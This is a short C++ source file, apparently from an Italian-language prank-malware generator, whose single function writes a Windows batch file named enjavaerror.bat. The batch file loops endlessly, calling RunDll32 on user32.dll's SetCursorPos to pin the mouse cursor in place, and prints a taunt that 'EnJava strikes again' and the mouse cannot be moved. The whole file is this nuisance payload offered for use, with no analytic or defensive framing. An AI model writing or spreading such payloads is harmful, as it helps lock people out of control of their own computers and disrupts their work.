#include <iostream>
#include <fstream>
#include <string>

using namespace std;

void executeEnjavaerror() {
    try {
		ofstream enjavaerror("enjavaerror.bat");
		enjavaerror << ("@echo off\n");
		enjavaerror << (":1\n");
		enjavaerror << ("RunDll32.exe user32.dll,SetCursorPos 100 100\n");
		enjavaerror << ("echo EnJava colpisce ancora! Non puoi muovere il tuo mouse!\n");
		enjavaerror << ("goto 1");
		cout << "\nFile creato con successo!\n";
		enjavaerror.close();
	} catch (...) {
		cout << "Errore durante la creazione del programma!";
	}
}